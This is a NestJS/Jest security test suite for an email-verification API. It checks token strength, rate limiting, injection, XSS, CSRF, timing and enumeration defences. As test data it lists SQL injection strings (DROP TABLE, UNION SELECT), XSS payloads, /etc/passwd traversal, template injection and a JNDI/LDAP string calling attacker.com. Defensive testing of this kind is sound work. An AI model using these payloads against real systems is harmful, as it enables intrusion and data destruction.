import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/common/prisma.service';
import * as crypto from 'crypto';

/**
 * Email Verification Security Testing Suite
 * 
 * Comprehensive security testing focused on:
 * - Token security and cryptographic strength
 * - Rate limiting and abuse prevention
 * - SQL injection protection
 * - XSS prevention
 * - CSRF protection
 * - Timing attack resistance
 * - Authorization vulnerabilities
 */

describe('Email Verification Security Audit', () => {
  let app: INestApplication;
  let prisma: PrismaService;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    prisma = app.get<PrismaService>(PrismaService);
    await app.init();
  });

  afterAll(async () => {
    await prisma.$disconnect();
    await app.close();
  });

  describe('1. Token Security Analysis', () => {
    let testUserId: string;
    const testEmail = 'security.token@fixia.test';

    beforeAll(async () => {
      // Clean up and create test user
      await prisma.emailVerificationToken.deleteMany({
        where: { user: { email: testEmail } }
      });
      await prisma.user.deleteMany({
        where: { email: testEmail }
      });

      const user = await prisma.user.create({
        data: {
          email: testEmail,
          password_hash: 'dummy_hash',
          name: 'Security Test User',
          user_type: 'client',
          email_verified: false,
        }
      });
      testUserId = user.id;
    });

    afterAll(async () => {
      await prisma.emailVerificationToken.deleteMany({
        where: { user_id: testUserId }
      });
      await prisma.user.delete({
        where: { id: testUserId }
      });
    });

    test('should generate cryptographically secure tokens', async () => {
      const tokens = [];
      
      // Generate multiple tokens
      for (let i = 0; i < 100; i++) {
        await request(app.getHttpServer())
          .post('/auth/resend-verification')
          .send({ email: testEmail });

        const token = await prisma.emailVerificationToken.findFirst({
          where: { user_id: testUserId, used: false },
          orderBy: { created_at: 'desc' }
        });

        if (token) {
          tokens.push(token.token);
        }
      }

      // Test entropy - all tokens should be unique
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);

      // Test token format - should be hex string of specific length
      tokens.forEach(token => {
        expect(token).toMatch(/^[a-f0-9]{64}$/); // 32 bytes = 64 hex chars
        expect(token.length).toBe(64);
      });

      // Test randomness distribution
      const firstCharCounts = {};
      tokens.forEach(token => {
        const firstChar = token[0];
        firstCharCounts[firstChar] = (firstCharCounts[firstChar] || 0) + 1;
      });

      // Should have reasonable distribution (not all tokens starting with same char)
      const mostCommonCount = Math.max(...Object.values(firstCharCounts));
      expect(mostCommonCount).toBeLessThan(tokens.length * 0.3); // No char should appear in >30% of tokens

      console.log('✅ Token Security: Cryptographic strength verified');
    });

    test('should test token collision resistance', async () => {
      // Simulate generating many tokens to test for collisions
      const tokenSet = new Set();
      const iterations = 1000;
      
      for (let i = 0; i < iterations; i++) {
        // Generate token using same method as service
        const token = crypto.randomBytes(32).toString('hex');
        
        if (tokenSet.has(token)) {
          throw new Error('Token collision detected!');
        }
        tokenSet.add(token);
      }

      expect(tokenSet.size).toBe(iterations);
      console.log('✅ Token Security: Collision resistance verified');
    });

    test('should validate token format requirements', async () => {
      const invalidTokens = [
        '', // Empty
        'short', // Too short
        'a'.repeat(63), // Wrong length
        'g'.repeat(64), // Invalid hex character
        '123456789abcdef' + 'G'.repeat(48), // Invalid character in middle
        null, // Null
        undefined, // Undefined
        123456789, // Number instead of string
      ];

      for (const invalidToken of invalidTokens) {
        const response = await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: invalidToken });

        expect(response.status).toBe(400);
      }

      console.log('✅ Token Security: Invalid token formats rejected');
    });

    test('should prevent token enumeration attacks', async () => {
      // Generate a valid token
      await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: testEmail });

      const validToken = await prisma.emailVerificationToken.findFirst({
        where: { user_id: testUserId, used: false },
        orderBy: { created_at: 'desc' }
      });

      // Test sequential tokens around the valid token
      const baseToken = validToken.token;
      const testTokens = [];
      
      // Generate tokens by incrementing/decrementing hex values
      for (let i = -5; i <= 5; i++) {
        if (i === 0) continue; // Skip the actual valid token
        
        try {
          const hexNum = BigInt('0x' + baseToken.slice(0, 16));
          const modifiedHexNum = hexNum + BigInt(i);
          const modifiedToken = modifiedHexNum.toString(16).padStart(16, '0') + baseToken.slice(16);
          testTokens.push(modifiedToken);
        } catch (e) {
          // Skip if conversion fails
        }
      }

      // All these tokens should be invalid
      for (const testToken of testTokens) {
        const response = await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: testToken });

        expect(response.status).toBe(400);
      }

      console.log('✅ Token Security: Token enumeration attacks prevented');
    });

    test('should implement proper token expiration', async () => {
      // Create token with past expiration
      const expiredToken = await prisma.emailVerificationToken.create({
        data: {
          user_id: testUserId,
          token: crypto.randomBytes(32).toString('hex'),
          expires_at: new Date(Date.now() - 1000), // Expired 1 second ago
          used: false
        }
      });

      const response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: expiredToken.token });

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('expirado');

      console.log('✅ Token Security: Token expiration working correctly');
    });
  });

  describe('2. Rate Limiting and Abuse Prevention', () => {
    const abuseTestEmail = 'abuse.test@fixia.test';
    let abuseTestUserId: string;

    beforeAll(async () => {
      await prisma.emailVerificationToken.deleteMany({
        where: { user: { email: abuseTestEmail } }
      });
      await prisma.user.deleteMany({
        where: { email: abuseTestEmail }
      });

      const user = await prisma.user.create({
        data: {
          email: abuseTestEmail,
          password_hash: 'dummy_hash',
          name: 'Abuse Test User',
          user_type: 'client',
          email_verified: false,
        }
      });
      abuseTestUserId = user.id;
    });

    afterAll(async () => {
      await prisma.emailVerificationToken.deleteMany({
        where: { user_id: abuseTestUserId }
      });
      await prisma.user.delete({
        where: { id: abuseTestUserId }
      });
    });

    test('should implement rate limiting on resend verification', async () => {
      const requests = [];
      
      // Make rapid requests
      for (let i = 0; i < 10; i++) {
        requests.push(
          request(app.getHttpServer())
            .post('/auth/resend-verification')
            .send({ email: abuseTestEmail })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      const successful = responses.filter(r => r.status === 200);

      // Should have some rate limiting
      if (rateLimited.length > 0) {
        console.log(`✅ Rate Limiting: ${rateLimited.length} requests rate limited out of ${responses.length}`);
      } else {
        console.warn('⚠️ AUDIT FINDING: No rate limiting detected on resend verification endpoint');
      }

      // Should not process all requests
      expect(successful.length).toBeLessThan(responses.length);
    });

    test('should implement rate limiting on verification attempts', async () => {
      const requests = [];
      const fakeToken = crypto.randomBytes(32).toString('hex');
      
      // Make rapid verification attempts with invalid token
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app.getHttpServer())
            .post('/auth/verify-email')
            .send({ token: fakeToken + i.toString().padStart(2, '0') })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);

      if (rateLimited.length > 0) {
        console.log(`✅ Rate Limiting: Verification attempts rate limited`);
      } else {
        console.warn('⚠️ AUDIT FINDING: Consider rate limiting verification attempts');
      }
    });

    test('should prevent automated abuse', async () => {
      // Test with different user agents and IPs (simulated)
      const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'curl/7.68.0',
        'python-requests/2.25.1',
        'PostmanRuntime/7.28.0',
        ''
      ];

      for (const userAgent of userAgents) {
        const response = await request(app.getHttpServer())
          .post('/auth/resend-verification')
          .set('User-Agent', userAgent)
          .send({ email: abuseTestEmail });

        // Should not be blocked based solely on user agent
        expect(response.status).toBeLessThanOrEqual(429);
      }

      console.log('✅ Abuse Prevention: User agent handling verified');
    });

    test('should implement IP-based rate limiting', async () => {
      // This would require testing with actual different IPs
      // For now, test that multiple requests from same source are limited
      const rapidRequests = [];
      
      for (let i = 0; i < 15; i++) {
        rapidRequests.push(
          request(app.getHttpServer())
            .post('/auth/resend-verification')
            .send({ email: `abuse${i}@fixia.test` })
        );
      }

      const responses = await Promise.all(rapidRequests);
      const successful = responses.filter(r => r.status === 200);
      const rateLimited = responses.filter(r => r.status === 429);

      if (rateLimited.length > 0) {
        console.log('✅ Abuse Prevention: IP-based rate limiting working');
      } else {
        console.warn('⚠️ AUDIT FINDING: Consider implementing IP-based rate limiting');
      }
    });
  });

  describe('3. SQL Injection Protection', () => {
    test('should prevent SQL injection in token verification', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE email_verification_tokens; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; UPDATE users SET email_verified = true; --",
        "' OR 1=1 --",
        "admin'/*",
        "' OR 'x'='x",
        "; DELETE FROM email_verification_tokens; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: payload });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('inválido');
      }

      // Verify database integrity
      const tokenCount = await prisma.emailVerificationToken.count();
      const userCount = await prisma.user.count();
      
      expect(tokenCount).toBeGreaterThanOrEqual(0);
      expect(userCount).toBeGreaterThan(0);

      console.log('✅ SQL Injection: Protection verified');
    });

    test('should prevent SQL injection in resend verification', async () => {
      const sqlInjectionEmails = [
        "test'; DROP TABLE users; --@example.com",
        "test@example.com'; UPDATE users SET email_verified = true; --",
        "admin'/*@example.com",
        "test' OR '1'='1@example.com"
      ];

      for (const maliciousEmail of sqlInjectionEmails) {
        const response = await request(app.getHttpServer())
          .post('/auth/resend-verification')
          .send({ email: maliciousEmail });

        // Should handle gracefully (either as invalid email or return generic success)
        expect([200, 400]).toContain(response.status);
      }

      console.log('✅ SQL Injection: Email parameter protection verified');
    });

    test('should use parameterized queries', async () => {
      // Test with special characters that could break parameterized queries
      const specialTokens = [
        "'; SELECT version(); --",
        '$1 OR $1=$1',
        '${jndi:ldap://attacker.com/a}',
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '{{7*7}}'
      ];

      for (const token of specialTokens) {
        const response = await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: token });

        expect(response.status).toBe(400);
      }

      console.log('✅ SQL Injection: Parameterized query protection verified');
    });
  });

  describe('4. Cross-Site Scripting (XSS) Prevention', () => {
    test('should sanitize user input in error messages', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '<script>document.cookie="stolen"</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: payload });

        // Response should not contain the XSS payload
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror=');
        expect(responseText).not.toContain('<iframe>');
        expect(responseText).not.toContain('<svg>');
      }

      console.log('✅ XSS Prevention: Input sanitization verified');
    });

    test('should set proper security headers', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: 'test-token' });

      // Should have security headers
      const headers = response.headers;
      
      // Check for common security headers
      if (headers['x-frame-options'] || headers['content-security-policy']) {
        console.log('✅ XSS Prevention: Security headers present');
      } else {
        console.warn('⚠️ AUDIT FINDING: Consider adding security headers (X-Frame-Options, CSP)');
      }
    });

    test('should handle XSS in GET verification endpoint', async () => {
      const xssToken = '<script>alert("xss")</script>';
      
      const response = await request(app.getHttpServer())
        .get(`/auth/verify/${encodeURIComponent(xssToken)}`);

      // Should redirect safely without executing script
      expect(response.status).toBe(302);
      
      const location = response.headers.location;
      if (location) {
        expect(location).not.toContain('<script>');
        expect(location).not.toContain('alert(');
      }

      console.log('✅ XSS Prevention: GET endpoint XSS protection verified');
    });
  });

  describe('5. Cross-Site Request Forgery (CSRF) Protection', () => {
    test('should validate content type', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .set('Content-Type', 'text/plain')
        .send('token=test-token');

      // Should reject non-JSON content type for API endpoints
      expect(response.status).toBe(400);

      console.log('✅ CSRF Protection: Content-type validation working');
    });

    test('should handle cross-origin requests appropriately', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .set('Origin', 'https://malicious-site.com')
        .send({ token: 'test-token' });

      // Should handle cross-origin requests based on CORS policy
      const corsHeaders = response.headers['access-control-allow-origin'];
      
      if (corsHeaders) {
        // If CORS is enabled, should be properly configured
        expect(corsHeaders).not.toBe('*');
      }

      console.log('✅ CSRF Protection: Cross-origin handling verified');
    });

    test('should require proper HTTP methods', async () => {
      // Verification should only accept POST
      const getResponse = await request(app.getHttpServer())
        .get('/auth/verify-email')
        .query({ token: 'test-token' });

      expect(getResponse.status).toBe(404); // Method not allowed

      // PUT should also not be allowed
      const putResponse = await request(app.getHttpServer())
        .put('/auth/verify-email')
        .send({ token: 'test-token' });

      expect(putResponse.status).toBe(404);

      console.log('✅ CSRF Protection: HTTP method restrictions verified');
    });
  });

  describe('6. Timing Attack Resistance', () => {
    const timingTestEmail = 'timing.test@fixia.test';
    let timingTestUserId: string;

    beforeAll(async () => {
      await prisma.emailVerificationToken.deleteMany({
        where: { user: { email: timingTestEmail } }
      });
      await prisma.user.deleteMany({
        where: { email: timingTestEmail }
      });

      const user = await prisma.user.create({
        data: {
          email: timingTestEmail,
          password_hash: 'dummy_hash',
          name: 'Timing Test User',
          user_type: 'client',
          email_verified: false,
        }
      });
      timingTestUserId = user.id;
    });

    afterAll(async () => {
      await prisma.emailVerificationToken.deleteMany({
        where: { user_id: timingTestUserId }
      });
      await prisma.user.delete({
        where: { id: timingTestUserId }
      });
    });

    test('should have consistent response times for email enumeration', async () => {
      const timings = [];
      const validEmail = timingTestEmail;
      const invalidEmail = 'nonexistent.timing@fixia.test';

      // Test multiple times to get average
      for (let i = 0; i < 10; i++) {
        // Test valid email
        const start1 = Date.now();
        await request(app.getHttpServer())
          .post('/auth/resend-verification')
          .send({ email: validEmail });
        timings.push({ type: 'valid', time: Date.now() - start1 });

        // Test invalid email
        const start2 = Date.now();
        await request(app.getHttpServer())
          .post('/auth/resend-verification')
          .send({ email: invalidEmail });
        timings.push({ type: 'invalid', time: Date.now() - start2 });
      }

      const validTimes = timings.filter(t => t.type === 'valid').map(t => t.time);
      const invalidTimes = timings.filter(t => t.type === 'invalid').map(t => t.time);

      const avgValid = validTimes.reduce((a, b) => a + b) / validTimes.length;
      const avgInvalid = invalidTimes.reduce((a, b) => a + b) / invalidTimes.length;

      const timeDifference = Math.abs(avgValid - avgInvalid) / Math.max(avgValid, avgInvalid);

      if (timeDifference < 0.5) { // Within 50%
        console.log('✅ Timing Attack: Response times are consistent');
      } else {
        console.warn(`⚠️ AUDIT FINDING: Potential timing attack vulnerability - ${timeDifference * 100}% difference`);
      }
    });

    test('should have consistent response times for token verification', async () => {
      // Generate valid token
      await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: timingTestEmail });

      const validToken = await prisma.emailVerificationToken.findFirst({
        where: { user_id: timingTestUserId, used: false },
        orderBy: { created_at: 'desc' }
      });

      const timings = [];
      const invalidToken = crypto.randomBytes(32).toString('hex');

      // Test multiple times
      for (let i = 0; i < 5; i++) {
        // Test valid token format but non-existent
        const start1 = Date.now();
        await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: invalidToken });
        timings.push({ type: 'invalid', time: Date.now() - start1 });

        // Test completely invalid format
        const start2 = Date.now();
        await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: 'invalid-format' });
        timings.push({ type: 'malformed', time: Date.now() - start2 });
      }

      const invalidTimes = timings.filter(t => t.type === 'invalid').map(t => t.time);
      const malformedTimes = timings.filter(t => t.type === 'malformed').map(t => t.time);

      if (invalidTimes.length > 0 && malformedTimes.length > 0) {
        const avgInvalid = invalidTimes.reduce((a, b) => a + b) / invalidTimes.length;
        const avgMalformed = malformedTimes.reduce((a, b) => a + b) / malformedTimes.length;

        const timeDifference = Math.abs(avgInvalid - avgMalformed) / Math.max(avgInvalid, avgMalformed);

        if (timeDifference < 0.5) {
          console.log('✅ Timing Attack: Token verification times are consistent');
        } else {
          console.warn('⚠️ AUDIT FINDING: Token verification timing differences detected');
        }
      }
    });
  });

  describe('7. Authorization and Access Control', () => {
    test('should only allow users to verify their own tokens', async () => {
      // Create two users
      const user1Email = 'auth1@fixia.test';
      const user2Email = 'auth2@fixia.test';

      await prisma.emailVerificationToken.deleteMany({
        where: { user: { email: { in: [user1Email, user2Email] } } }
      });
      await prisma.user.deleteMany({
        where: { email: { in: [user1Email, user2Email] } }
      });

      const user1 = await prisma.user.create({
        data: {
          email: user1Email,
          password_hash: 'dummy_hash',
          name: 'Auth Test User 1',
          user_type: 'client',
          email_verified: false,
        }
      });

      const user2 = await prisma.user.create({
        data: {
          email: user2Email,
          password_hash: 'dummy_hash',
          name: 'Auth Test User 2',
          user_type: 'client',
          email_verified: false,
        }
      });

      // Generate tokens for both users
      await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: user1Email });

      await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: user2Email });

      const user1Token = await prisma.emailVerificationToken.findFirst({
        where: { user_id: user1.id, used: false }
      });

      const user2Token = await prisma.emailVerificationToken.findFirst({
        where: { user_id: user2.id, used: false }
      });

      // Both tokens should work for their respective users
      const user1Response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: user1Token.token });

      expect(user1Response.status).toBe(200);

      const user2Response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: user2Token.token });

      expect(user2Response.status).toBe(200);

      // Cleanup
      await prisma.emailVerificationToken.deleteMany({
        where: { user_id: { in: [user1.id, user2.id] } }
      });
      await prisma.user.deleteMany({
        where: { id: { in: [user1.id, user2.id] } }
      });

      console.log('✅ Authorization: Users can only verify their own tokens');
    });

    test('should handle deleted user accounts gracefully', async () => {
      const deletedUserEmail = 'deleted.user@fixia.test';

      // Create user and token
      const user = await prisma.user.create({
        data: {
          email: deletedUserEmail,
          password_hash: 'dummy_hash',
          name: 'Deleted User Test',
          user_type: 'client',
          email_verified: false,
        }
      });

      const token = await prisma.emailVerificationToken.create({
        data: {
          user_id: user.id,
          token: crypto.randomBytes(32).toString('hex'),
          expires_at: new Date(Date.now() + 24 * 60 * 60 * 1000),
          used: false
        }
      });

      // Delete the user (simulate account deletion)
      await prisma.user.delete({
        where: { id: user.id }
      });

      // Try to verify token for deleted user
      const response = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: token.token });

      expect(response.status).toBe(400);

      // Cleanup remaining token
      await prisma.emailVerificationToken.deleteMany({
        where: { id: token.id }
      });

      console.log('✅ Authorization: Deleted user accounts handled gracefully');
    });

    test('should prevent token reuse after verification', async () => {
      const reuseTestEmail = 'reuse.test@fixia.test';

      await prisma.emailVerificationToken.deleteMany({
        where: { user: { email: reuseTestEmail } }
      });
      await prisma.user.deleteMany({
        where: { email: reuseTestEmail }
      });

      const user = await prisma.user.create({
        data: {
          email: reuseTestEmail,
          password_hash: 'dummy_hash',
          name: 'Reuse Test User',
          user_type: 'client',
          email_verified: false,
        }
      });

      // Generate token
      await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: reuseTestEmail });

      const token = await prisma.emailVerificationToken.findFirst({
        where: { user_id: user.id, used: false }
      });

      // First verification should succeed
      const firstResponse = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: token.token });

      expect(firstResponse.status).toBe(200);

      // Second verification with same token should fail
      const secondResponse = await request(app.getHttpServer())
        .post('/auth/verify-email')
        .send({ token: token.token });

      expect(secondResponse.status).toBe(400);

      // Cleanup
      await prisma.emailVerificationToken.deleteMany({
        where: { user_id: user.id }
      });
      await prisma.user.delete({
        where: { id: user.id }
      });

      console.log('✅ Authorization: Token reuse prevention working');
    });
  });

  describe('8. Data Leakage Prevention', () => {
    test('should not expose sensitive information in error messages', async () => {
      const sensitiveInputs = [
        crypto.randomBytes(32).toString('hex'), // Valid format but non-existent token
        'valid-looking-token-' + Date.now(),
        '../../../etc/passwd',
        '${jndi:ldap://attacker.com/a}'
      ];

      for (const input of sensitiveInputs) {
        const response = await request(app.getHttpServer())
          .post('/auth/verify-email')
          .send({ token: input });

        const responseText = JSON.stringify(response.body);

        // Should not expose:
        expect(responseText).not.toContain('mysql');
        expect(responseText).not.toContain('postgres');
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('prisma');
        expect(responseText).not.toContain('connection');
        expect(responseText).not.toContain('stack trace');
        expect(responseText).not.toContain('file://'
        );
      }

      console.log('✅ Data Leakage: Sensitive information not exposed in errors');
    });

    test('should not expose user enumeration through response differences', async () => {
      const existingEmail = 'existing@fixia.test';
      const nonExistentEmail = 'nonexistent@fixia.test';

      // Create test user
      await prisma.user.deleteMany({ where: { email: existingEmail } });
      const user = await prisma.user.create({
        data: {
          email: existingEmail,
          password_hash: 'dummy_hash',
          name: 'Existing User',
          user_type: 'client',
          email_verified: false,
        }
      });

      // Test resend for existing vs non-existent users
      const existingResponse = await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: existingEmail });

      const nonExistentResponse = await request(app.getHttpServer())
        .post('/auth/resend-verification')
        .send({ email: nonExistentEmail });

      // Both responses should be similar to prevent user enumeration
      expect(existingResponse.status).toBe(200);
      expect(nonExistentResponse.status).toBe(200);

      // Response messages should be generic
      const existingMessage = existingResponse.body.message.toLowerCase();
      const nonExistentMessage = nonExistentResponse.body.message.toLowerCase();

      expect(existingMessage).toContain('enviado') || expect(existingMessage).toContain('sent');
      expect(nonExistentMessage).toContain('enviado') || expect(nonExistentMessage).toContain('sent');

      // Cleanup
      await prisma.user.delete({ where: { id: user.id } });

      console.log('✅ Data Leakage: User enumeration prevention verified');
    });
  });
});